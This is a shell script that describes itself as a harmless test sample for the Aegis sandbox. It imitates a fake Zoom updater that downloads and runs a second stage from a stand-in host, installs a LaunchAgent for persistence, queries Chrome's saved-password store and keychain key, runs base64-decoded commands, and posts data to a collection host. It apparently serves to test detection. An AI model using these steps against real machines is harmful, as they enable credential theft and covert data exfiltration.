#!/bin/sh
# AEGIS TEST SAMPLE: harmless. Written by scripts/try-sandbox.mts to exercise the sandbox.
# It only looks like a malicious installer. Without AEGIS_SANDBOX=1 it does nothing.
[ "$AEGIS_SANDBOX" = "1" ] || { echo "Aegis test sample: runs only inside the Aegis sandbox."; exit 0; }

echo "Installing Zoom update 6.4.1..."

# 1. Download a second stage and run it. The .invalid host never resolves, and the sandbox has no
#    network, so nothing is downloaded and sh runs nothing.
curl -fsSL https://updates.zoom-support.invalid/stage2.sh | sh

# 2. Persistence: a LaunchAgent that would start at login. $HOME is a scratch folder here.
mkdir -p "$HOME/Library/LaunchAgents"
cat > "$HOME/Library/LaunchAgents/us.zoom.updater.plist" <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
  <key>Label</key><string>us.zoom.updater</string>
  <key>ProgramArguments</key><array><string>/bin/echo</string><string>aegis-test</string></array>
  <key>RunAtLoad</key><true/>
</dict></plist>
PLIST

# 3. Look for Chrome's saved passwords and ask the keychain for Chrome's key. Neither exists here.
ls "$HOME/Library/Application Support/Google/Chrome/Default/Login Data" 2>/dev/null
security find-generic-password -w -s "Chrome Safe Storage" 2>/dev/null

# 4. Decode base64 and run it. It decodes to: echo aegis-test-stage
echo ZWNobyBhZWdpcy10ZXN0LXN0YWdl | base64 -d | sh

# 5. Send what it found home. Blocked: no network, and the host never resolves.
wget -q -O /dev/null --post-data "host=$(hostname)" https://collect.zoom-support.invalid/upload

echo "Update complete."
